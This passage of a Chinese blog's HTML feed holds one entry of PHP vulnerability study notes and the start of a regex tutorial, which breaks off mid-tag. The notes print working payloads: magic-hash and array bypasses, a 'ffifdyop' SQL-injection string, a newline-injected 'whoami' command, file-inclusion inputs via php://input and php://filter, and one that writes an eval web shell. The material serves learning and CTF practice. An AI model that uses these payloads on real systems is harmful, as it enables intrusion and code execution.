class="token punctuation">)</span>            <span class="token comment">//0e830400451993494058024219903391</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'240610708'</span><span class="token punctuation">)</span>            <span class="token comment">//0e462097431906509019562988736854</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s878926199a'</span><span class="token punctuation">)</span>        <span class="token comment">//0e545993274517709034328855841020</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s155964671a'</span><span class="token punctuation">)</span>        <span class="token comment">//0e342768416822451524974117254469</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s214587387a'</span><span class="token punctuation">)</span>        <span class="token comment">//0e848240448830537924465865611904</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s878926199a'</span><span class="token punctuation">)</span>        <span class="token comment">//0e545993274517709034328855841020</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s1091221200a'</span><span class="token punctuation">)</span>        <span class="token comment">//0e940624217856561557816327384675</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s1885207154a'</span><span class="token punctuation">)</span>        <span class="token comment">//0e509367213418206700842008763514</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2.md5([])绕过<code>===</code></p><p>因为md5()函数不能处理数组，因此在md5()遇到数组时会警告而且返回null，然而能够忽略警告并经过数组绕过<code>===</code>，以下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span>@<span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> @<span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">//bool(true)</span><span class="token function">var_dump</span><span class="token punctuation">(</span>@<span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> @<span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">//bool(true)，@表示忽略警告</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token constant">null</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//bool(true)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>ffifdyop</code>，这个点的原理是 ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6，<br>而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是1select * from ‘admin’ where password=’’ or ‘6xxxxx’</p><p>等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数</p><h3 id="sha1-函数"><a href="#sha1-函数" class="headerlink" title="sha1()函数"></a>sha1()函数</h3><p>sha1()与md5()基本原理相同，因此此处仅列出sha1()开头为“0e”的字符串。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aaroZmOk'</span><span class="token punctuation">)</span>    <span class="token comment">//0e66507019969427134894567494305185566735</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aaK1STfY'</span><span class="token punctuation">)</span>    <span class="token comment">//0e76658526655756207688271159624026011393</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aaO8zKZF'</span><span class="token punctuation">)</span>    <span class="token comment">//0e89257456677279068558073954252716165668</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aa3OFF9m'</span><span class="token punctuation">)</span>    <span class="token comment">//0e36977786278517984959260394024281014729</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="strcmp-、strcasecmp-函数"><a href="#strcmp-、strcasecmp-函数" class="headerlink" title="strcmp()、strcasecmp()函数"></a>strcmp()、strcasecmp()函数</h3><ul><li><p><code>strcmp(string1, string2)</code>、<code>strcasecmp(string1, string2)</code></p><p>比较两个字符串，前者不区分大小写，后者区分大小写。若<code>string1 &gt; string2</code>，返回<code>&gt; 0</code>；若<code>string1 &lt; string2</code>，string返回<code>&lt; 0</code>;若<code>string1 = string2</code>，返回<code>0</code>。然而该函数没法处理数组，当出现数组时，返回<code>null</code>。(下例中@表示忽略警告)</p><pre class="line-numbers language-none"><code class="language-none">var_dump(@strcmp([],1));                &#x2F;&#x2F;NULLvar_dump(@strcmp([],&#39;flag&#39;) &#x3D;&#x3D; 0);    &#x2F;&#x2F;bool(true)var_dump(@strcmp([],&#39;flag&#39;) &#x3D;&#x3D;&#x3D; 0);    &#x2F;&#x2F;bool(false)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h3><p><code>intval()</code> 在转换的时候，会从字符串的开始进行转换直到遇到一个非数字的字符。即使出现无法转换的字符串，<code>intval()</code> 不会报错而是返回 0。</p><pre class="line-numbers language-none"><code class="language-none">var_dump(intval(&#39;2&#39;)) &#x2F;&#x2F; 2var_dump(intval(&#39;3abcd&#39;)) &#x2F;&#x2F; 3var_dump(intval(&#39;abcd&#39;)) &#x2F;&#x2F; 0var_dump(0 &#x3D;&#x3D; &#39;0&#39;); &#x2F;&#x2F; truevar_dump(0 &#x3D;&#x3D; &#39;abcdefg&#39;); &#x2F;&#x2F; true var_dump(0 &#x3D;&#x3D;&#x3D; &#39;abcdefg&#39;); &#x2F;&#x2F; falsevar_dump(1 &#x3D;&#x3D; &#39;1abcdef&#39;); &#x2F;&#x2F; trueif(intval($a) &gt; 1000) &#123;    mysql_query(&quot;select * from news where id&#x3D;&quot;.$a)&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="trim"><a href="#trim" class="headerlink" title="trim"></a>trim</h4><p>trim 函数会过滤空格以及 \n\r\t\v\0，但不会过滤过滤\f</p><pre class="line-numbers language-none"><code class="language-none">$a &#x3D; &quot;  \n\r\t\v\0abc  \f&quot;;var_dump(trim($a)); &#x2F;&#x2F; abc  \f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>可以在这个网站学习学习正则[regex]:(<a href="https://regexr.com/">https://regexr.com/</a>)</p><h4 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match"></a>preg_match</h4><p>preg_match 函数用于进行正则表达式匹配，返回 pattern 的匹配次数，它的值将是 0 次（不匹配）或 1 次，因为 preg_match() 在第一次匹配后将会停止搜索。如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(<code>^</code> 和 <code>$</code>)，则可以存在绕过的问题</p><pre class="line-numbers language-none"><code class="language-none">$ip &#x3D; &#39;1.1.1.1 abcd&#39;; &#x2F;&#x2F; 可以绕过if(!preg_match(&quot;&#x2F;(\d+)\.(\d+)\.(\d+)\.(\d+)&#x2F;&quot;,$ip)) &#123;  die(&#39;error&#39;);&#125; else &#123;  &#x2F;&#x2F; echo(&#39;key...&#39;)&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>pre_match 在匹配的时候会消耗较大的资源，并且默认存在贪婪匹配，如果传入一个超长的字符串，会导致 pre_match 消耗大量资源从而导致 php 超时，后面的 php 语句就不会执行。payload:</p><pre class="line-numbers language-none"><code class="language-none">$code&#x3D;&quot;xdsec###AAAAAAAAAAAAAAAAAAA(超多个A)&quot;;preg_match(&quot;&#x2F;(\d+)\.(\d+)\.(\d+)\.(\d+)&#x2F;&quot;, $code));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>就是匹配文件名由字母、数字、下划线、破则号、斜杠、空白字符各种组合的并且后缀名是rpt的文件，如果匹配成功，就执行系统命令file打印文件的类型和编码信息，如果匹配失败就打印’regex failed’.</p><p>[<a href="http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt%0Awhoami%5D">http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt%0awhoami]</a>(<a href="http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt">http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt</a> whoami)</p><p>如果开启了/m，会存在绕过</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$file_name&#x3D;$_GET[&#39;path&#39;];if (!preg_match(&quot;&#x2F;^[a-zA-Z0-9-s_]+.rpt$&#x2F;m&quot;, $file_name)) &#123;  echo &quot;regex failed&quot;;&#125; else &#123;    echo exec(&quot;&#x2F;usr&#x2F;bin&#x2F;file -i -b &quot;.$file_name);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意到正则表达式结尾的/m 了，在php中，/m表示开启多行匹配模式，开启多行匹配模式之后<code>^</code>和<code>$</code>的含义就发生了变化，没开启多行模式之前(即单行匹配模式), <code>^</code> 和<code>$</code> 是匹配字符串的开始和结尾，开启多行模式之后，多行模式<code>^</code>,<code>$</code>可以匹配每行的开头和结尾，所以上述payload里面含有换行符，被当做两行处理，一行匹配OK即可，所以进入了exec执行分支，进而导致命令执行。</p><p>[<a href="http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt%0Awhoami%5D">http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt%0awhoami]</a>(<a href="http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt">http://10.10.10.141/test/test_rce/4/rce_path.php?path=filed.rpt</a> whoami)</p><p>开启/m</p><pre class="line-numbers language-none"><code class="language-none">^ 行首$ 行尾<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>不开启/m</p><pre class="line-numbers language-none"><code class="language-none">^ 字符串的开始$ 字符串的结尾<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>修饰符说明</p><pre class="line-numbers language-none"><code class="language-none">i 在和正则匹配是不区分大小写 m 将字符串视为多行。默认的正则开始“^”和结束“$”将目标字条串作为一单一的一“行”字符（甚至其中包括换行符也是如此）。如果在修饰符中加上“m”，那么开始和结束将会指点字符串的每一行的开头就是“^”结束就是“$”。 o 评估表达式只有一次s 如果设定了这个修正符，那么，被匹配的字符串将视为一行来看，包括换行符，换行符将被视为普通字符串。 x 忽略空白，除非进行转义的不被忽略。 g 在全局范围内找到所有匹配cg 即使全局匹配失败也允许搜索继续<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="preg-match-all"><a href="#preg-match-all" class="headerlink" title="preg_match_all"></a>preg_match_all</h4><p>正则表达式全局匹配，成功返回整个模式匹配的次数（可能为零），如果出错返回 FALSE</p><h4 id="ereg-00-截断"><a href="#ereg-00-截断" class="headerlink" title="ereg %00 截断"></a>ereg %00 截断</h4><p>ereg 读到 %00 的时候，就截止了</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php    if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; FALSE)  &#123;        echo &#39;You password must be alphabet&#39;;    &#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里 <code>a=abcd%001234</code>，可以绕过</p><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><h4 id="extract"><a href="#extract" class="headerlink" title="extract"></a>extract</h4><p>extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php      $auth &#x3D; &#39;0&#39;;      &#x2F;&#x2F; 这里可以覆盖$auth的变量值    extract($_GET);     if($auth &#x3D;&#x3D; 1)&#123;          echo &quot;private!&quot;;      &#125; else&#123;          echo &quot;public!&quot;;      &#125;  ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str"></a>parse_str</h4><p>parse_str() 的作用是解析字符串，并注册成变量。与 parse_str() 类似的函数还有 mb_parse_str()，parse_str 将字符串解析成多个变量，如果参数 str 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;var.php?var&#x3D;new  $var&#x3D;&#39;init&#39;;  parse_str($_SERVER[&#39;QUERY_STRING&#39;]);&#x2F;&#x2F; $var 会变成 newecho $var;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="变量覆盖-1"><a href="#变量覆盖-1" class="headerlink" title="$$ 变量覆盖"></a>$$ 变量覆盖</h4><p>如果把变量本身的 key 也当变量，也就是使用了 <code>$$</code>，就可能存在问题。</p><pre class="line-numbers language-none"><code class="language-none">$_ &#x3D; &#39;_POST&#39;;&#x2F;&#x2F; $$_ 是等于 $_POST<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>例子</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?_CONFIG&#x3D;123$_CONFIG[&#39;extraSecure&#39;] &#x3D; true;foreach(array(&#39;_GET&#39;,&#39;_POST&#39;) as $method) &#123;    foreach($$method as $key&#x3D;&gt;$value) &#123;      &#x2F;&#x2F; $key &#x3D;&#x3D; _CONFIG      &#x2F;&#x2F; $$key &#x3D;&#x3D; $_CONFIG      &#x2F;&#x2F; 这个函数会把 $_CONFIG 变量销毁      unset($$key);    &#125;&#125;if ($_CONFIG[&#39;extraSecure&#39;] &#x3D;&#x3D; false) &#123;    echo &#39;flag &#123;****&#125;&#39;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>数组类型数据的覆盖</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; index.php?_SESSION[userinfo][id]&#x3D;1&amp;_SESSION[userinfo][username]&#x3D;adminforeach (array(&#39;_COOKIE&#39;,&#39;_POST&#39;,&#39;_GET&#39;) as $_request)  &#123;    foreach ($$_request as $_key&#x3D;&gt;$_value)      &#123;        $$_key&#x3D;  $_value;    &#125;&#125;echo $_SESSION[&quot;userinfo&quot;][&quot;id&quot;];echo &#39;&lt;br&gt;&#39;;echo $_SESSION[&quot;userinfo&quot;][&quot;username&quot;];<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是如果后面有 <code>session_start()</code> 会重新初始化上面的 <code>$_SESSION</code> 数据，因此又被还原回去。</p><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这四个函数会将包含的文件作为php文件解析</p><p>_once表示同名文件只引入一次，include在引入不存文件时产生一个警告且脚本还会继续执行，require则会导致一个致命性错误且脚本停止执行。<br>include()是有条件包含函数，而 require()则是无条件包含函数<br>include有返回值，而require没有<br>理论上来说：include和require后面加不加括号对执行结果没有区别，但是加上括号效率较低，所以后面能不加括号就不加括号。</p><p>可利用的文件包含漏洞条件：<br>1.include()等函数通过动态变量方式引入需要包含的文件<br>2.用户可控制该动态变量</p><h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><p>涉及的相关协议：<code>file://</code>、<code>php://filter</code>、<code>php://input</code>、<code>zip://</code>、<code>compress.bzip2://</code>、<code>compress.zlib://</code>、<code>data://</code></p><h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><ul><li><p>简介<br><code>php://</code>:是个能够访问请求的原始数据的只读流。POST请求的状况下，最好用<code>php://input</code>来代替<code>$HTTP_RAW_POST_DATA</code>，由于他不依赖于特定的<code>php.ini</code>指令，并且，这样的状况下<code>$HTTP_RAW_POST_DATA</code>默认没有填充，比激活<code>always_populate_raw_post_data</code>潜在须要更少的内存，<code>enctype=&quot;multipart/form-data&quot;</code>的时候<code>php://input</code>是无效的。</p><p>简单理解：除<code>enctype=&quot;multipart/form-data&quot;</code>外，获取POST数据（可做为php代码执行）。</p></li><li><p>使用条件</p></li><li><p>范例</p><p>环境：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;input.php&lt;?phpinclude($_GET[file]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>应用：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;payload[GET DATA]:   input.php?file&#x3D;php:&#x2F;&#x2F;input[POST DATA 1]:&lt;?php phpinfo();?&gt;[POST DATA 2]:&lt;?php system(&#39;ls&#39;);?&gt;[POST DATA 3]:&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&#39;&lt;?php @eval($_POST[cmd]);?&gt;&#39;);?&gt;    #我没写入成功，缘由待查。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php:filter"></a>php:filter</h4><ul><li><p>介绍<br><code>php://filter</code> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数很是有用，相似 <code>readfile()</code>、<code>file()</code>和<code>file_get_contents()</code>， 在数据流内容读取以前没有机会应用其余过滤器。</p><p><code>php://filter</code>目标使用如下的参数做为它路径的一部分。 复合过滤链可以在一个路径上指定。详细使用这些参数能够参考具体范例。<br><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208203954389.png" alt="image-20210208203954389"></p></li><li><p>使用条件</p><ol><li>allow_url_include = Off/On #无要求</li></ol></li><li><p>范例</p><p>环境：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;filter.php&lt;?phpinclude($_GET[file]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>应用：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;payload[GAT DATA 1]:    filter.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;filter.php  [GET DATA 2]:    filter.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;filter.php  [GAT DATA 3]:    filter.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;php:&#x2F;&#x2F;input    [POST DATA]:    &lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h2><p>简介<br>PHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，而且对于应用程序中的全部页面都是可用的。在您把用户信息存储到 PHP session 中以前，首先必须使用<code>session_start()</code>启动会话。<br>php的session文件的保存路径能够再phpinfo的session.save_path查询到<br><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208203749051.png" alt="image-20210208203749051"><br>常见的php-session存放位置：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID&#x2F;tmp&#x2F;sess_PHPSESSID&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>session的文件名格式为sess_[phpsessid]。而phpsessid在发送的请求的cookie字段中能够看到。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h2><p>最近在复习，自己php的题目做的还比较少，只实践了部分php漏洞。</p><p>在整理漏洞的过程中发现一些漏洞对于我来说是非常陌生的，在整理的过程中也拓宽了自己的视野。</p><p>最近php8也发布了，一些漏洞说不定已经过时，又会出现新的漏洞。只有不断的学习才能适应这个快速发展的时代！</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式学习</title>
      <link href="2020/webbasic/zheng-ze-biao-da-shi-xue-xi/"/>
      <url>2020/webbasic/zheng-ze-biao-da-shi-xue-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>概念：</p><p>正则表达式是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。</p><p>简介：</p><p>正则表达式是对字符串（包括普通字符（例如，a 到 z 之间的字母）和特殊字符（称为“元字符”））操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。正则表达式是一种文本模式，该模式描述在搜索文本时要匹配的一个或多个字符串。                       ——摘自百度百科</p><p>那么它的功能是什么呢？</p><p>我的理解就是进行字符串的匹配验证，查找替换，分割截取之类的</p><p>它的组成：</p><ul><li><p>1.普通字符：除了元字符之外的可打印和不可打印字符，一般都是简单的匹配自身，比如hello匹配‘hello</p></li><li><p>2.元字符 ：除了普通字符进行的确切的匹配之外,还需要进行一些模糊匹配,所以需要一些特殊字符来表示如: .   [ ] (  ) * + ? ^ $ \ |  如需要对这些特殊字符进行匹配只需要进行转义即可</p></li></ul><h2 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h2><table><thead><tr><th align="center">字符</th><th>描述</th></tr></thead><tbody><tr><td align="center">\</td><td>转义字符</td></tr><tr><td align="center">^</td><td>匹配字符串开始的位置</td></tr><tr><td align="center">$</td><td>匹配字符串结尾的位置</td></tr><tr><td align="center">.</td><td>匹配除换行符（\n、\r）之外的任何单个字符，相等于【^\n\r】</td></tr><tr><td align="center">|</td><td>或</td></tr><tr><td align="center">[]</td><td>字符集合,可以和上面的字符配合起来使用</td></tr><tr><td align="center">()</td><td>分组</td></tr><tr><td align="center">*</td><td><strong>零次或多次</strong>匹配前面的字符或子表达式</td></tr><tr><td align="center">+</td><td><strong>一次或多次</strong>匹配前面的字符或子表达式</td></tr><tr><td align="center">?</td><td><strong>零次或一次</strong>匹配前面的字符或子表达式</td></tr><tr><td align="center">{n}</td><td>指定匹配的次数, 比如m{2}不能匹配“amy“,只能匹配“ammy”</td></tr><tr><td align="center">{n,}</td><td>至少匹配的次数, 比如m{2}不能匹配“amy“,但是能匹配“ammmmmmy”, 如m{1,}可以用m+来表示,m{0,}可以用m*来表示,都是一样的意思</td></tr><tr><td align="center">{n,m}</td><td>在上一个的基础上,限定了最多匹配多少次</td></tr><tr><td align="center">?</td><td>?出现在上面6个限定符之后,则阻止它们进行贪婪匹配, 比如对于aaaaaa, a+?只匹配第一个字符串, 而a+全都匹配</td></tr><tr><td align="center">\b (boundary)</td><td>匹配单词边界, 如er\b只能匹配never里面的er,但不能匹配verb中的er</td></tr><tr><td align="center">\B</td><td>匹配非单词边界, 和上面相反</td></tr><tr><td align="center">\cx</td><td>c表示键盘输入control,x表示键盘上的所有大小写字母,如\cC 表示ctrl+c</td></tr><tr><td align="center">\d      (digit)</td><td>匹配一个数字</td></tr><tr><td align="center">\f</td><td>换页符</td></tr><tr><td align="center">\n</td><td>换行符</td></tr><tr><td align="center">\s</td><td>匹配空字符</td></tr><tr><td align="center">\S</td><td>匹配非空字符</td></tr><tr><td align="center">\t</td><td>匹配水平制表符</td></tr><tr><td align="center">\v</td><td>匹配垂直制表符</td></tr><tr><td align="center">\w</td><td>匹配字母、数字、下划线。等价于[A-Za-z0-9_]</td></tr><tr><td align="center">\W</td><td>匹配非字母、数字、下划线。等价于 [^A-Za-z0-9_]</td></tr><tr><td align="center">\xn</td><td>匹配 n，其中 n 为十六进制转义值。十六进制转义值必须为确定的两个数字长。例如，’\x41’ 匹配 “A”。’\x041’ 则等价于 ‘\x04’ &amp; “1”。正则表达式中可以使用 ASCII 编码。</td></tr><tr><td align="center">\num</td><td>匹配 num，其中 num 是一个正整数。对所获取的匹配的引用。例如，’(.)\1’ 匹配两个连续的相同字符。</td></tr><tr><td align="center">\n</td><td>标识一个八进制转义值或一个向后引用。如果 \n 之前至少 n 个获取的子表达式，则 n 为向后引用。否则，如果 n 为八进制数字 (0-7)，则 n 为一个八进制转义值。</td></tr><tr><td align="center">\nml</td><td>如果 n 为八进制数字 (0-3)，且 m 和 l 均为八进制数字 (0-7)，则匹配八进制转义值 nml。</td></tr><tr><td align="center">\un</td><td>匹配 n，其中 n 是一个用四个十六进制数字表示的 Unicode 字符。例如， \u00A9 匹配版权符号 (?)。</td></tr></tbody></table><h2 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h2><table><thead><tr><th align="center">修饰符</th><th>含义</th><th>描述</th></tr></thead><tbody><tr><td align="center">i</td><td>ignore - 不区分大小写</td><td>将匹配设置为不区分大小写，搜索时不区分大小写: A 和 a 没有区别。</td></tr><tr><td align="center">g</td><td>global - 全局匹配</td><td>查找所有的匹配项。</td></tr><tr><td align="center">m</td><td>multi line - 多行匹配</td><td>使边界字符 <strong>^</strong> 和 <strong>$</strong> 匹配每一行的开头和结尾，是多行!，而不是整个字符串的开头和结尾。</td></tr><tr><td align="center">s</td><td>特殊字符圆点 <strong>.</strong> 中包含换行符 <strong>\n</strong></td><td>默认情况下的圆点 <strong>.</strong> 是 匹配除换行符 <strong>\n</strong> 之外的任何字符，加上 <strong>s</strong> 修饰符之后, <strong>.</strong> 中包含换行符 \n。</td></tr></tbody></table><h2 id="先行断言"><a href="#先行断言" class="headerlink" title="先行断言"></a>先行断言</h2><table><thead><tr><th align="left">字符</th><th>描述</th></tr></thead><tbody><tr><td align="left">a(?=b)</td><td>先行断言,a在b前面才会匹配</td></tr><tr><td align="left">a(?!b)</td><td>先行否定断言,a不在b前面才会匹配</td></tr></tbody></table><h2 id="后行断言"><a href="#后行断言" class="headerlink" title="后行断言"></a>后行断言</h2><table><thead><tr><th>字符</th><th>描述</th></tr></thead><tbody><tr><td>(?&lt;=b)a</td><td>后行断言,a只有在b后面才匹配</td></tr><tr><td>(?&lt;!b)a</td><td>后行否定断言,a只有不在b后面才进行匹配</td></tr></tbody></table><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="来匹配个邮箱吧"><a href="#来匹配个邮箱吧" class="headerlink" title="来匹配个邮箱吧"></a>来匹配个邮箱吧</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;^([\w-.]*)@([A-Za-z0-9]+).([A-Za-z]&#123;2,10&#125;)$&#x2F;gmi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208204051643.png" alt="image-20210208204051643"></p><p>发现有形如edu.cn的匹配不了了…..把.放进去就可以了</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;^([\w-.]*)([@A-Za-z0-9]+\.)+([A-Za-z]&#123;2,10&#125;)$&#x2F;gmi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208204105174.png" alt="image-20210208204105174"></p><p>应该都是能匹配上的,匹配的有些许的粗糙,目前只会写一点简单的</p><h3 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h3><p>根据IP地址的特点,可以写出下面的正则来匹配</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;^(\d&#123;1&#125;|[1-9]&#123;1&#125;\d&#123;1&#125;|1\d\d|2[0-4]\d|25[0-5])\.(\d&#123;1&#125;|[1-9]&#123;1&#125;\d&#123;1&#125;|1\d\d|2[0-4]\d|25[0-5])\.(\d&#123;1&#125;|[1-9]&#123;1&#125;\d&#123;1&#125;|1\d\d|2[0-4]\d|25[0-5])\.(\d&#123;1&#125;|[1-9]&#123;1&#125;\d&#123;1&#125;|1\d\d|2[0-4]\d|25[0-5])$&#x2F;gmi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208204426135.png" alt="image-20210208204426135"></p><h3 id="时间"><a href="#时间" class="headerlink" 